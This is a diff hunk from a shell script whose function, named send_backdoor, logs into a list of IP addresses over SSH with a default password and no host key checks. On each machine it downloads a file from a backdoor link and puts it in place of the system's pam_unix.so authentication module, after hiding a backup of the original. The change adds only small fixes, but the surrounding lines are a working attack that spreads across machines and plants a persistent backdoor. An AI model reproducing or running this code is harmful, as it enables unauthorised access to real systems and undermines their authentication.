@@ -19,8 +19,8 @@ send_backdoor() {
     for IP in "${IPs[@]}"; do
         for admin in "${admins[@]}"; do
             sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                echo \"$default_password\" | sudo -S apt install curl &&
-                echo \"$default_password\" | sudo -S curl -o /tmp/pam_unix.so $backdoor_link &&
+                echo \"$default_password\" | sudo -S apt install curl -y &&
+                echo \"$default_password\" | sudo -S curl -o /tmp/pam_unix.so "$backdoor_link" &&
                 echo \"$default_password\" | sudo -S cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/.pam_unix.so.bak &&
                 echo \"$default_password\" | sudo -S mv /tmp/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
             "
